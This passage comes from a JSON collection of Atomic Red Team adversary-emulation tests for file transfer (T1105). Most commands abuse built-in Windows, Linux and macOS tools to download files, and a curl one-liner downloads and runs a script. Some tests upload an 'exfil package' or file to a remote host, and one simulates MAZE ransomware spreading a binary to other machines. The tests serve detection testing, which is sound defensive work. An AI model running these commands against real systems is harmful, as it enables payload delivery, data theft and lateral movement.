                                "description": "URL of file to download",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
                            },
                            "local_path": {
                                "description": "Location to save downloaded file",
                                "type": "path",
                                "default": "%temp%\\Atomic-license.txt"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "Must have a Windows Defender version with MpCmdRun.exe installed",
                                "prereq_command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe /?  >nul 2>&1\n",
                                "get_prereq_command": "Echo \"A version of Windows Defender with MpCmdRun.exe must be installed manually\""
                            }
                        ],
                        "executor": {
                            "command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}\n",
                            "cleanup_command": "del #{local_path} >nul 2>&1\ndel %temp%\\MpCmdRun.log >nul 2>&1",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "whois file download",
                        "auto_generated_guid": "c99a829f-0bb8-4187-b2c6-d47d1df74cab",
                        "description": "Download a remote file using the whois utility\n",
                        "supported_platforms": [
                            "linux",
                            "macos"
                        ],
                        "input_arguments": {
                            "remote_host": {
                                "description": "Remote hostname or IP address",
                                "type": "string",
                                "default": "localhost"
                            },
                            "remote_port": {
                                "description": "Remote port to connect to",
                                "type": "integer",
                                "default": 8443
                            },
                            "output_file": {
                                "description": "Path of file to save output to",
                                "type": "path",
                                "default": "/tmp/T1105.whois.out"
                            },
                            "query": {
                                "description": "Query to send to remote server",
                                "type": "string",
                                "default": "Hello from Atomic Red Team test T1105"
                            },
                            "timeout": {
                                "description": "Timeout period before ending process (seconds)",
                                "type": "integer",
                                "default": 1
                            }
                        },
                        "dependencies": [
                            {
                                "description": "The whois and timeout commands must be present\n",
                                "prereq_command": "which whois && which timeout\n",
                                "get_prereq_command": "echo \"Please install timeout and the whois package\"\n"
                            }
                        ],
                        "executor": {
                            "name": "sh",
                            "elevation_required": false,
                            "command": "timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} \"#{query}\" > #{output_file}\n",
                            "cleanup_command": "rm -f #{output_file}\n"
                        }
                    },
                    {
                        "name": "File Download via PowerShell",
                        "auto_generated_guid": "54a4daf1-71df-4383-9ba7-f1a295d8b6d2",
                        "description": "Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "target_remote_file": {
                                "description": "File to download",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt"
                            },
                            "output_file": {
                                "description": "File to write to",
                                "type": "string",
                                "default": "LICENSE.txt"
                            }
                        },
                        "executor": {
                            "command": "(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "File download with finger.exe on Windows",
                        "auto_generated_guid": "5f507e45-8411-4f99-84e7-e38530c45d01",
                        "description": "Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.\nBecause this is being tested on the localhost, you should not be expecting a successful connection\nhttps://www.exploit-db.com/exploits/48815\nhttps://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_host": {
                                "description": "Remote hostname or IP address",
                                "type": "string",
                                "default": "localhost"
                            }
                        },
                        "executor": {
                            "name": "command_prompt",
                            "command": "finger base64_filedata@#{remote_host}\n"
                        }
                    },
                    {
                        "name": "Download a file with IMEWDBLD.exe",
                        "auto_generated_guid": "1a02df58-09af-4064-a765-0babe1a0d1e2",
                        "description": "Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.\nDownloaded files can be found in \"%LocalAppData%\\Microsoft\\Windows\\INetCache\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>\" or `%LocalAppData%\\Microsoft\\Windows\\INetCache\\IE\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.\nRun \"Get-ChildItem -Path C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue\" without quotes and adding the correct username and file name to locate the file.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_url": {
                                "description": "Location of file to be downloaded.",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml"
                            },
                            "file_name": {
                                "description": "Name of the file to be downloaded without extension.",
                                "type": "string",
                                "default": "T1105"
                            }
                        },
                        "executor": {
                            "command": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"\n& $imewdbled #{remote_url}\n",
                            "cleanup_command": "$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\" \n$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)\nif(\"\" -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction Ignore }\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Curl Download File",
                        "auto_generated_guid": "2b080b99-0deb-4d51-af0f-833d37c4ca6a",
                        "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.\nExpected output will include whether the file downloaded successfully or not.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "file_download": {
                                "description": "File to download",
                                "type": "string",
                                "default": "https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll"
                            },
                            "curl_path": {
                                "description": "path to curl.exe",
                                "type": "path",
                                "default": "C:\\Windows\\System32\\Curl.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Curl must be installed on system.\n",
                                "prereq_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "Invoke-WebRequest \"https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-7.79.1-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\n"
                            }
                        ],
                        "executor": {
                            "command": "#{curl_path} -k #{file_download} -o c:\\users\\public\\music\\allthethingsx64.dll\n#{curl_path} -k #{file_download} --output c:\\users\\public\\music\\allthethingsx64.dll\n#{curl_path} -k #{file_download} -o c:\\programdata\\allthethingsx64.dll\n#{curl_path} -k #{file_download} -o %Temp%\\allthethingsx64.dll\n",
                            "cleanup_command": "del c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1\ndel c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1\ndel c:\\programdata\\allthethingsx64.dll >nul 2>&1\ndel %Temp%\\allthethingsx64.dll >nul 2>&1\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Curl Upload File",
                        "auto_generated_guid": "635c9a38-6cbf-47dc-8615-3810bc1167cf",
                        "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration\nExpected output will include whether the file uploaded successfully or not.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "curl_path": {
                                "description": "path to curl.exe",
                                "type": "path",
                                "default": "C:\\Windows\\System32\\Curl.exe"
                            },
                            "remote_destination": {
                                "description": "Remote destination",
                                "type": "string",
                                "default": "www.example.com"
                            },
                            "file_path": {
                                "description": "File to upload",
                                "type": "string",
                                "default": "c:\\temp\\atomictestfile.txt"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Curl must be installed on system.\n",
                                "prereq_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "Invoke-WebRequest \"https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip\" -Outfile PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-7.79.1-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\n"
                            },
                            {
                                "description": "A file must be created to upload\n",
                                "prereq_command": "if (Test-Path #{file_path}) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "echo \"This is an Atomic Test File\" > #{file_path}\n"
                            }
                        ],
                        "executor": {
                            "command": "#{curl_path} -T #{file_path} #{remote_destination}\n#{curl_path} --upload-file #{file_path} #{remote_destination}\n#{curl_path} -d #{file_path} #{remote_destination}\n#{curl_path} --data #{file_path} #{remote_destination}\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Download a file with Microsoft Connection Manager Auto-Download",
                        "auto_generated_guid": "d239772b-88e2-4a2e-8473-897503401bcc",
                        "description": "Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. \nThe issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.\nUpon successful execution the test will open calculator and Notepad executable for 10 seconds.\nreference:\nhttps://twitter.com/ElliotKillick/status/1455897435063074824\nhttps://github.com/LOLBAS-Project/LOLBAS/pull/151\nhttps://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\nhttps://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "Path_to_file": {
                                "description": "Path to the Batch script",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1105\\src\\T1105.bat"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "#{Path_to_file} must exist on system.\n",
                                "prereq_command": "if (Test-Path \"#{Path_to_file}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{Path_to_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.bat\" -OutFile \"#{Path_to_file}\"\n"
                            }
                        ],
                        "executor": {
                            "command": "\"#{Path_to_file}\" 1>NUL \n",
                            "cleanup_command": "del /f/s/q %temp%\\T1105 >nul 2>&1\nrmdir /s/q %temp%\\T1105 >nul 2>&1\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "MAZE Propagation Script",
                        "auto_generated_guid": "70f4d07c-5c3e-4d53-bb0a-cdf3ada14baf",
                        "description": "This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\\Temp directory of each one. \nUpon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html \n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "binary_file": {
                                "description": "Binary file to copy to remote machines",
                                "type": "string",
                                "default": "$env:comspec"
                            },
                            "exe_remote_folder": {
                                "description": "Path to store executable on remote machine (no drive letter)",
                                "type": "string",
                                "default": "\\Windows\\Temp\\T1105.exe"
                            },
                            "remote_drive_letter": {
                                "description": "Remote drive letter",
                                "type": "string",
                                "default": "C"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Binary file must exist at specified location (#{binary_file})\n",
                                "prereq_command": "if (Test-Path #{binary_file}) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "write-host \"The binary_file input parameter must be set to a binary that exists on this computer.\"\n"
                            },
                            {
                                "description": "Machine list must exist at specified location (\"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\")\n",
                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nnew-item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\" | Out-Null\necho \"A machine list file has been generated at \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\". Please enter the machines to target there, one machine per line.\"\n"
                            }
                        ],
                        "executor": {
                            "command": "$machine_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"\n$offline_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"\n$completed_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"\nforeach ($machine in get-content -path \"$machine_list\")\n{if (test-connection -Count 1 -computername $machine -quiet) \n{cmd /c copy \"#{binary_file}\" \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\"\necho $machine >> \"$completed_list\"\nwmic /node: \"$machine\" process call create \"regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}\"}\nelse\n{echo $machine >> \"$offline_list\"}}\n",
                            "cleanup_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\") \n{foreach ($machine in get-content -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\")\n{wmic /node: \"$machine\" process where name='\"regsvr32.exe\"' call terminate | out-null\nRemove-Item -path \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\" -force -erroraction silentlycontinue}}\nRemove-Item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\" -erroraction silentlycontinue\nRemove-item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\" -erroraction silentlycontinue\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Printer Migration Command-Line Tool UNC share folder into a zip file",
                        "auto_generated_guid": "49845fc1-7961-4590-a0f0-3dbcf065ae7e",
                        "description": "Create a ZIP file from a folder in a remote drive\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "Path_unc": {
                                "description": "Path to the UNC folder",
                                "type": "path",
                                "default": "\\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\"
                            },
                            "Path_PrintBrm": {
                                "description": "Path to PrintBrm.exe",
                                "type": "path",
                                "default": "C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe"
                            }
                        },
                        "executor": {
                            "command": "del %TEMP%\\PrintBrm.zip >nul 2>&1 \n#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\\PrintBrm.zip -O FORCE\n",
                            "cleanup_command": "del %TEMP%\\PrintBrm.zip >nul 2>&1\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Lolbas replace.exe use to copy file",
                        "auto_generated_guid": "54782d65-12f0-47a5-b4c1-b70ee23de6df",
                        "description": "Copy file.cab to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "replace_cab": {
                                "description": "Path to the cab file",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1105\\src\\redcanary.cab"
                            },
                            "Path_replace": {
                                "description": "Path to replace.exe",
                                "type": "path",
                                "default": "C:\\Windows\\System32\\replace.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "#{replace_cab} must exist on system.\n",
                                "prereq_command": "if (Test-Path \"#{replace_cab}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{replace_cab}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/redcanary.cab\" -OutFile \"#{replace_cab}\"\n"
                            }
                        ],
                        "executor": {
                            "command": "del %TEMP%\\redcanary.cab >nul 2>&1\n#{Path_replace} \"#{replace_cab}\" %TEMP% /A\n",
                            "cleanup_command": "del %TEMP%\\redcanary.cab >nul 2>&1\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Lolbas replace.exe use to copy UNC file",
                        "auto_generated_guid": "ed0335ac-0354-400c-8148-f6151d20035a",
                        "description": "Copy UNC file to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "replace_cab": {
                                "description": "UNC Path to the cab file",
                                "type": "path",
                                "default": "\\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\redcanary.cab"
                            },
                            "Path_replace": {
                                "description": "Path to replace.exe",
                                "type": "path",
                                "default": "C:\\Windows\\System32\\replace.exe"
                            }
                        },
                        "executor": {
                            "command": "del %TEMP%\\redcanary.cab >nul 2>&1\n#{Path_replace} #{replace_cab} %TEMP% /A\n",
                            "cleanup_command": "del %TEMP%\\redcanary.cab >nul 2>&1\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "certreq download",
                        "auto_generated_guid": "6fdaae87-c05b-42f8-842e-991a74e8376b",
                        "description": "Use certreq to download a file from the web",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "local_path": {
                                "description": "Local path to place file",
                                "type": "string",
                                "default": "%temp%\\Atomic-license.txt"
                            },
                            "remote_file": {
                                "description": "URL of file to copy",
                                "type": "url",
                                "default": "https://example.com"
                            }
                        },
                        "executor": {
                            "command": "certreq.exe -Post -config #{remote_file} c:\\windows\\win.ini #{local_path}",
                            "cleanup_command": "del #{local_path} >nul 2>&1",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Download a file using wscript",
                        "auto_generated_guid": "97116a3f-efac-4b26-8336-b9cb18c45188",
                        "description": "Use wscript to run a local VisualBasic file to download a remote file",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "vbscript_file": {
                                "description": "Full path to the VisualBasic downloading the file",
                                "type": "string",
                                "default": "PathToAtomicsFolder\\T1105\\src\\T1105-download-file.vbs"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "#{vbscript_file} must be exist on system.\n",
                                "prereq_command": "if (Test-Path \"#{vbscript_file}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{vbscript_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105-download-file.vbs\" -OutFile \"#{vbscript_file}\"\n"
                            }
                        ],
                        "executor": {
                            "command": "wscript.exe \"#{vbscript_file}\"\n",
                            "cleanup_command": "del Atomic-License.txt >nul 2>&1",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Linux Download File and Run",
                        "auto_generated_guid": "bdc373c5-e9cf-4563-8a7b-a9ba720a90f3",
                        "description": "Utilize linux Curl to download a remote file, chmod +x it and run it.\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "remote_url": {
                                "description": "url of remote payload",
                                "type": "string",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh"
                            },
                            "payload_name": {
                                "description": "payload name",
                                "type": "string",
                                "default": "atomic.sh"
                            }
                        },
                        "executor": {
                            "command": "curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}\n",
                            "cleanup_command": "rm #{payload_name}\n",
                            "name": "sh"
                        }
                    },
                    {
                        "name": "Nimgrab - Transfer Files",
                        "auto_generated_guid": "b1729c57-9384-4d1c-9b99-9b220afb384e",
                        "description": "Use nimgrab.exe to download a file from the web. \n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_file": {
                                "description": "URL of file to copy",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
                            },
                            "destination_path": {
                                "description": "Destination path to file",
                                "type": "path",
                                "default": "$env:TEMP\\Atomic-license.txt"
                            }
                        },
                        "executor": {
                            "command": "cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\" #{remote_file} #{destination_path}\n",
                            "cleanup_command": "del #{destination_path} >nul 2>&1\n",
                            "name": "command_prompt"
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "NimGrab must be installed on system.\n",
                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://nim-lang.org/download/nim-1.6.6_x64.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim\\nim-1.6.6\\bin\\nimgrab.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\"\n"
                            }
                        ]
                    },
                    {
                        "name": "iwr or Invoke Web-Request download",
                        "auto_generated_guid": "c01cad7f-7a4c-49df-985e-b190dcf6a279",
                        "description": "Use 'iwr' or \"Invoke-WebRequest\" -URI argument to download a file from the web. Note: without -URI also works in some versions.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_file": {
                                "description": "URL of file to copy",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
                            },
                            "local_path": {
                                "description": "Local path to place file",
                                "type": "path",
                                "default": "%temp%\\Atomic-license.txt"
                            }
                        },
                        "executor": {
                            "command": "powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}\n",
                            "cleanup_command": "del %temp%\\Atomic-license.txt >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Arbitrary file download using the Notepad++ GUP.exe binary",
                        "auto_generated_guid": "66ee226e-64cb-4dae-80e3-5bf5763e4a51",
                        "description": "GUP is an open source signed binary used by Notepad++ for software updates, and can be used to download arbitrary files(.zip) from internet/github.\n[Reference](https://x.com/nas_bench/status/1535322182863179776?s=20)\nUpon execution, a sample zip file will be downloaded to C:\\Temp\\Sample folder",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "target_file_url": {
                                "description": "URL of the target ZIP file (Eg: https://example.com/test.zip)",
                                "type": "url",
                                "default": "https://getsamplefiles.com/download/zip/sample-2.zip"
                            },
                            "working_dir": {
                                "description": "The directory where GUP.exe & it's dependecies exists",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1105\\bin\\"
                            },
                            "gup_executable": {
                                "description": "GUP is an open source signed binary used by Notepad++ for software updates",
                                "type": "String",
                                "default": "PathToAtomicsFolder\\T1105\\bin\\GUP.exe"
                            },
                            "target_file_sha256": {
                                "description": "SHA256 value of target ZIP file",
                                "type": "string",
                                "default": "CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Gup.exe binary must exist on disk at specified location (#{gup_executable})",
                                "prereq_command": "if (Test-Path \"#{gup_executable}\") {exit 0} else {exit 1}",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{gup_executable}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/bin/GUP.exe\" -OutFile \"#{gup_executable}\""
                            }
                        ],
                        "executor": {
                            "command": "mkdir \"c:\\Temp\"\ncd #{working_dir}\nGUP.exe -unzipTo \"\" \"C:\\Temp\" \"Sample #{target_file_url} #{target_file_sha256}\"",
                            "cleanup_command": "rmdir /s /q \"C:\\Temp\\Sample\" >nul 2>nul",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "File download via nscurl",
                        "auto_generated_guid": "5bcefe5f-3f30-4f1c-a61a-8d7db3f4450c",
                        "description": "Use nscurl to download and write a file/payload from the internet.\n-k = Disable certificate checking\n-o = Output destination\n",
                        "supported_platforms": [
                            "macos"
                        ],
                        "input_arguments": {
                            "remote_file": {
                                "description": "URL of remote file to download",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
                            },
                            "destination_path": {
                                "description": "Local path to place remote file",
                                "type": "path",
                                "default": "license.txt"
                            }
                        },
                        "executor": {
                            "command": "nscurl -k \"#{remote_file}\" -o \"#{destination_path}\"",
                            "cleanup_command": "rm \"#{destination_path}\"",
                            "name": "sh",
                            "elevation_required": false
                        }
                    },
                    {
                        "name": "File Download with Sqlcmd.exe",
                        "auto_generated_guid": "6934c16e-0b3a-4e7f-ab8c-c414acd32181",
                        "description": "One of the windows packages 'Sqlcmd.exe' can be abused to download malicious files from C2 servers\nThis Atomic will exhibit the similar behavior by downloading a sample zip file from src directory of this Technique folder via GitHub URL",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_url": {
                                "description": "URL of the C2 Server from where file/s need to be downloaded",
                                "type": "url",
                                "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip"
                            },
                            "local_file_path": {
                                "description": "The local file path along with filename to where the file needs to be downloaded and placed.",
                                "type": "path",
                                "default": "C:\\T1105.zip"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Windows package 'Sqlcmd' need to be available in the machine to execute this atomic successfully",
                                "prereq_command": "if (Get-Command sqlcmd 2>$null) {exit 0} else {exit 1}",
                                "get_prereq_command": "winget install Microsoft.Sqlcmd --silent 2>$null | Out-Null"
                            }
                        ],
                        "executor": {
                            "command": "sqlcmd -i #{remote_url} -o #{local_file_path}",
                            "cleanup_command": "rm \"#{local_file_path}\" 2>$null | Out-Null",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Remote File Copy using PSCP",
                        "auto_generated_guid": "c82b1e60-c549-406f-9b00-0a8ae31c9cfe",
                        "description": "Copy a staged file using PSCP.exe to a public target location.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "pscp_url": {
                                "description": "pscp.exe download path",
                                "type": "string",
                                "default": "https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe"
                            },
                            "pscp_binary": {
                                "description": "PSCP binary location",
                                "type": "string",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\pscp.exe"
                            },
                            "scp_user": {
                                "description": "Username of the SCP user",
                                "type": "string",
                                "default": "atomic"
                            },
                            "scp_password": {
                                "description": "Password for the SCP User",
                                "type": "string",
                                "default": "atomic"
                            },
                            "scp_port": {
                                "description": "port for the remote server",
                                "type": "string",
                                "default": "22"
                            },
                            "exfil_package": {
                                "description": "path to exfil package",
                                "type": "path",
                                "default": "C:\\Temp\\T1105_scp.zip"
                            },
                            "target_location": {
                                "description": "Remote location where the data will be copied to.",
                                "type": "string",
                                "default": "127.0.0.1"
                            },
                            "target_filename": {
                                "description": "Filename on the destination.",
                                "type": "string",
                                "default": "T1105_scp.zip"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "pscp.exe must be available on the system.\n",
                                "prereq_command": "if (Test-Path #{pscp_binary}) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"#{pscp_url}\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\pscp.exe\"\n"
                            }
                        ],
                        "executor": {
                            "command": "fsutil file createnew C:\\Temp\\T1105_scp.zip 1048576\necho y | #{pscp_binary} -P #{scp_port} -pw #{scp_password} #{exfil_package} #{scp_user}@#{target_location}:#{target_filename}\n",
                            "cleanup_command": "del /f /q #{exfil_package}\n",
                            "name": "command_prompt",
                            "elevation_required": false
                        }
                    },
                    {
                        "name": "Windows push file using scp.exe",
                        "auto_generated_guid": "2a4b0d29-e5dd-4b66-b729-07423ba1cd9d",
